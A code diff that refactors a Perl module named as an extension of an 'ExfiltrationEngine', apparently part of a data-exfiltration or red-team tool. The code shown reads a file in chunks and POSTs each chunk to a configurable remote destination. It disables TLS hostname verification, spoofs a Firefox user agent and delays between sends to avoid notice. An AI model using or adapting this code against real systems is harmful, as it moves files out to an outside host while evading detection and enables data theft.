@@ -8,14 +8,13 @@ use Moose;
 extends 'ExfiltrationEngine';
 
 use LWP::UserAgent;
-use JSON;
-use Readonly;
+use JSON::MaybeXS;
 use Term::ProgressBar;
 
-Readonly my $START_TRANSFER => 1;
-Readonly my $IN_TRANSFER    => 0;
-Readonly my $END_TRANSFER   => -1;
-Readonly my $LIMIT_TRANFER  => 4000;
+use constant START_TRANSFER => 1;
+use constant IN_TRANSFER    => 0;
+use constant END_TRANSFER   => -1;
+use constant LIMIT_TRANFER  => 4000;
 
 sub setHeader {
     my($req) = @_;
@@ -51,34 +50,34 @@ sub sendData {
 sub exfiltrate {
     my($self, $file) = @_;
     my($data, $n, $count, $size);
-    my $userAgent = new LWP::UserAgent(ssl_opts => { verify_hostname => 0 });
-    my $request = new HTTP::Request 'POST' => $self->dest;
+    my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+    my $request = HTTP::Request->new('POST' => $self->dest);
     my $id = int(rand(100000)) + int(rand(100));
 
-    my $fileSize = $self->SUPER::load($file);
+    my $fileSize = $self->SUPER::loadFile($file);
     my $progress = Term::ProgressBar->new ({count => $fileSize, name => "Sending $file", ETA=>'linear'});
 
     $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');
 
     setHeader($request);
 
-    sendData($self, $request, $userAgent, $file, '', $id, $START_TRANSFER);
+    sendData($self, $request, $userAgent, $file, '', $id, START_TRANSFER);
 
     $count = 0;
-    $size = $self->size <= $LIMIT_TRANFER ? $self->size : $LIMIT_TRANFER;
+    $size = $self->size <= LIMIT_TRANFER ? $self->size : LIMIT_TRANFER;
     while (($n = read $self->file, $data, $size) != 0) {
         $count += $n;
-        sendData($self, $request, $userAgent, $file, $data, $id, $IN_TRANSFER);
+        sendData($self, $request, $userAgent, $file, $data, $id, IN_TRANSFER);
         $progress->update($count);
 
         sleep($self->delay);
     }
 
-    sendData($self, $request, $userAgent, $file, '', $id, $END_TRANSFER);
+    sendData($self, $request, $userAgent, $file, '', $id, END_TRANSFER);
 
     print "\n";
 
-    $self->SUPER::close();
+    $self->SUPER::closeFile();
 }
 
 1;
